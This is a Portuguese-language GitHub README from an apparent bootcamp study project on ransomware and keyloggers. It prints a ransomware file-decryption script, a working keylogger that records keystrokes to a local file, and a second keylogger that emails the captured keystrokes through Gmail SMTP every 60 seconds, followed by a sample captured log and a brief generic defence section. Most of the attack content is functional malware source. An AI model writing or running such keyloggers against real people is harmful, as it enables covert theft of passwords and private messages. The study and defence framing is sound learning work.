# Keylogger

Este repositorio é o estudo do dio para obter conhecimenento sobre ransoware e keyloggers de atacantes, e assim adquirir conheciementos da gravidade deste tipo de ataque,as consequnias e as formas de evitar este tipo de ataque.
Ao desenvolver os scripts consegui aprender um pouco de programação em python e uso da interface de desenvolvimento de código VS Code.


# Ramsonware

## Script
```
from cryptography.fernet import Fernet
import os

def carregar_chave():
    return open("chave.key", "rb").read()

def descriptografar_arquivo(arquivo, chave):
    f = Fernet(chave)
    with open(arquivo, "rb") as file:
        dados = file.read()
        dados_descriptografados = f.decrypt(dados)
    with open(arquivo, "wb") as file:
        file.write(dados_descriptografados)

def encontrar_arquivos(diretorio):
    lista = []
    for raiz, _, arquivos in os.walk(diretorio):
        for nome in arquivos:    
            caminho = os.path.join(raiz, nome)
            if nome != "descriptografar.py" and not nome.endswith(".key"):
                lista.append(caminho)
    return lista

def main():
    chave = carregar_chave()
    arquivos = encontrar_arquivos("test_files")
    for arquivo in arquivos:
        descriptografar_arquivo(arquivo, chave)
    print("Arquivos restaurados com sucesso!")

if __name__=="__main__":
    main()

```

## Arquivos gerados

<img width="308" height="356" alt="VSCode_malware" src="https://github.com/user-attachments/assets/6ebc615f-aa90-40cc-a892-b1eb5109d428" />

Senha original:\
<img width="302" height="78" alt="senhatxt" src="https://github.com/user-attachments/assets/6dede5d1-1f57-49a5-a4d4-d98fc6a4c544" />

Dados originais:\
<img width="288" height="181" alt="dados_conftxt" src="https://github.com/user-attachments/assets/b8f1d4fe-fe0c-4209-9340-f4a0a9d3564d" />




## Resultado

**Executando o script**

Linha de comando:\
<img width="851" height="75" alt="malware_executado" src="https://github.com/user-attachments/assets/99021bd5-6b9e-4e9a-b946-1bd401232baa" />

Arquivos criptografados:\
<img width="1124" height="62" alt="senhas_criptografadas" src="https://github.com/user-attachments/assets/ca208aa2-982f-492e-b73f-5b00d1e330a1" /> 

<img width="1149" height="69" alt="dados_criptografados" src="https://github.com/user-attachments/assets/c472c04e-450d-4162-b68d-d59f5b06382a" /> 



**Descriptografar**

Linha de comando:
<img width="940" height="71" alt="descriptografar_executado" src="https://github.com/user-attachments/assets/b4972df6-bee8-4789-8c53-b25b88335c84" />

Ao rodar o script de descritografia

Senha descriptograda\
<img width="302" height="78" alt="senhatxt" src="https://github.com/user-attachments/assets/7d5d7376-ff9b-4f0e-953a-cdd1cc6a079f" />

Dados descriptografados\
<img width="288" height="181" alt="dados_conftxt" src="https://github.com/user-attachments/assets/21b25eb0-cf01-41fc-9887-1b63159d6a66" />


# Keylogger simples

## Script

```

from pynput import keyboard

IGNORAR = {
    keyboard.Key.shift,
    keyboard.Key.shift_r,
    keyboard.Key.ctrl_l,
    keyboard.Key.ctrl_r,
    keyboard.Key.alt_l,
    keyboard.Key.alt_r,
    keyboard.Key.caps_lock,
    keyboard.Key.cmd
} 

def on_press(key):
    try:
        # Se for uma letra  normal (letra, número  símbolo)
        with open("log.txt", "a", encoding="utf-8") as f:
            f.write(key.char)

    except AttributeError:
        with open("log.txt", "a", encoding="utf-8") as f:
            if key == keyboard.Key.space:
                f.write(" ")
            elif key == keyboard.Key.enter:
                f.write("\n")
            elif key == keyboard.Key.tab:
                f.write("\t")
            elif key == keyboard.Key.backspace:
                f.write(" ")
            elif key == keyboard.Key.esc:
                f.write("[ESC]")
            elif key in IGNORAR:
                pass
            else:
                f.write(f"[{key}]")
with keyboard.Listener(on_press=on_press) as listener:
    listener.join()

```


## Arquivos gerados

Log.txt

```
allan
dsdfplkçskfs
dffdsd
 teste de li  logger
[ESC]c   fuetc  ltech 470
c

Capturando o a vitima digantea  a ando os carectores no tecledo   ado
123 senha
pegou
```



## Resultado

Como resultado obtemos, com sucesso, um arquivo TXT com os dados vindo do teclado, mas o arquivo está sendo escrito e armazenado localmente na máquina da vítima.

# Keylogger com envio automático

## Script

```
from pynput import keyboard
import smtplib
from email.mime.text import MIMEText # formata o conteudo como texto
from threading import Timer

log = "" # Variavel global para armazenar os dados capturados

# CONFIGURAÇOES DE EMAIL
EMAIL_ORIGEM = "XXXXX@gmail.com"
SENHA_EMAIL = "XXXX XXXX XXXX XXXX"
EMAIL_DESTINO = "XXXXX@gmail.com"

def enviar_email():
    global log
    if log:
        msg = MIMEText(log)
        msg['Subject'] = "Dados capturados pelo Keylogger"
        msg['From'] = EMAIL_ORIGEM
        msg['To'] = EMAIL_DESTINO

        try:
            with smtplib.SMTP('smtp.gmail.com', 587) as server:
                server.starttls()
                server.login(EMAIL_ORIGEM, SENHA_EMAIL)
                server.send_message(msg)
                server.quit()
                print("Email enviado com sucesso!")
        except Exception as e:
            print("Erro ao enviar email", e)

        log = " " 

#Agendar o envio a cada 60 segundos
Timer(60, enviar_email).start()

def on_press(key):
    global log
    try:
        # Se for uma letra  normal (letra, número  símbolo)
        log += key.char
    except AttributeError:
        if key == keyboard.Key.space:
            log += " "
        elif key == keyboard.Key.enter:
            log += "\n"
        elif key == keyboard.Key.tab:
            log += "\t"
        elif key == keyboard.Key.backspace:
            log += "[BACKSPACE]"
        elif key == keyboard.Key.esc:
            log += "[ESC]"
        else: 
            pass #Ignooraelif key ir, controladores, shift, alt, caps lock, etc.

# Inicia o keeylogge e o envio automatico
with keyboard.Listener(on_press=on_press) as listener:
    enviar_email()  # Inicia o envio de email
    listener.join()
```

## Arquivos gerados

<img width="951" height="282" alt="keylogger_email" src="https://github.com/user-attachments/assets/10d12215-855c-4b6c-97aa-0f9063c8b541" />

## Resultado

Um email chegou na caixa de entrada com os dados obtidos:\

<img width="1153" height="419" alt="GmailKeyLogger" src="https://github.com/user-attachments/assets/7f8a7cd8-a3b3-403f-971b-75a0ba585447" />


# Defesa 

**Estratégias de Proteção e Contenção contra Keyloggers e Ransomware**

Para conter ameaças como keyloggers e ransomware, é fundamental aplicar uma defesa em camadas que combine tecnologia avançada, isolamento de sistemas e o fator humano.

1. **Antivírus, Firewalls e Controle de Tráfego**\
O uso integrado de antivírus com firewalls de sistema e de rede permite controlar rigorosamente o tráfego de dados e impedir invasões. Os firewalls modernos vão além do bloqueio básico. Eles utilizam listas atualizadas de arquivos maliciosos, identificam padrões de ataque e bloqueiam atividades suspeitas em tempo real, como o bloqueio automático do protocolo SMTP caso detectem disparos abusivos de e-mails.

3. **Monitoramento Inteligente e Análise de Comportamento**\
Como segunda camada de defesa, soluções baseadas em Inteligência Artificial e Machine Learning monitoram continuamente o comportamento dos aplicativos no sistema. Essa detecção comportamental identifica ações anômalas típicas de ransomware (como a criptografia em massa de arquivos) ou de keyloggers (como a captura oculta de digitação), permitindo interromper a ameaça mesmo que seja um vírus inédito.

4. **Ambientes Controlados e Isolamento**\
Para evitar que arquivos suspeitos contaminem a rede principal, é essencial utilizar ambientes isolados de teste, como sandboxes e máquinas virtuais. Essas ferramentas criam barreiras seguras onde programas desconhecidos podem ser executados e analisados sem oferecer risco aos dados reais da empresa ou do usuário.

5. **Conscientização e Fator Humano**\
Na segurança da informação, o ser humano costuma ser o elo mais fraco da corrente. Por isso, investir na conscientização contínua dos usuários é indispensável. Treinamentos regulares ajudam a equipe a identificar tentativas de engenharia social, evitando cliques em links maliciosos ou o download de anexos infectados que servem de porta de entrada para esses ataques.

# Conclusão

Consegui aprender programação em Python e entender mais sobre ransomware e tipos de keyloggers. Os ransomwares são muito temidos e representam a maior ameaça para uma empresa, pois podem levar à paralisação total das operações. O ransosnre que vimos aqui é um script simples, o eos ataacntes utilizam scrioptis bem mais complexos e ameaçadores. Além disso, as chances de recuperar os dados perdidos são mínimas sem um bom backup mantido atualizado com frequência. Continuar usando o GitHub para guardar o meu aprendizado ajudou a conhecer novos aplicativos. Essas descobertas são importantes para manter o interesse no assunto de cyber segurança.

 
